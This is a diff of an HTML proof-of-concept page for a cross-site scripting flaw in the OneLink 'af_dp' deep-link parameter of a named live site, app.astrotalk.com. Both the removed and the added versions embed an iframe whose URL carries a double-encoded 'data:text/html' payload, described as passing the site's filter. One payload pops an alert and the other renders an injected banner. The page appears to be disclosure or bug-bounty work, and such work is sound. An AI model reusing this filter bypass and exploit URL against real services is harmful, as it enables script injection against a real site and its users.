@@ -1,20 +1,6 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>OneLink af_dp XSS PoC — app.astrotalk.com</title>
-<style>
-  body{margin:0;background:#0a0a0a;color:#0f0;font-family:monospace}
-  header{padding:10px 14px;font-size:13px;line-height:1.5}
-  iframe{display:block;width:100%;height:calc(100vh - 70px);border:0;background:#000}
-</style>
-</head>
-<body>
-<header>
-  <b>PoC:</b> app.astrotalk.com OneLink template with attacker af_dp<br>
-  payload: data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;  (double-encoded to pass the filter)
-</header>
-<iframe src="https://app.astrotalk.com/3LHk?af_force_deeplink=true&af_dp=data:text/html,%253Cscript%253Ealert(document.domain)%253C%2Fscript%253E://"></iframe>
-</body>
-</html>
+<html><head><meta charset="utf-8"><title>OneLink af_dp XSS PoC</title></head>
+<body style="margin:0;background:#000">
+<div style="color:#0f0;font-family:monospace;padding:8px">app.astrotalk.com OneLink af_dp payload — injects into the frame below</div>
+<iframe src="https://app.astrotalk.com/3LHk?af_force_deeplink=true&af_dp=data:text/html,%253Cbody%2520style%253D%2522background:black%253Bcolor:lime%253Bfont-size:40px%2522%253E%253Ch1%253E%25E2%259C%2593%2520XSS-EXECUTED-ON-DATA-ORIGIN%253C%2Fh1%253E://" width="100%" height="600" style="border:3px solid red"></iframe>
+</body></html>
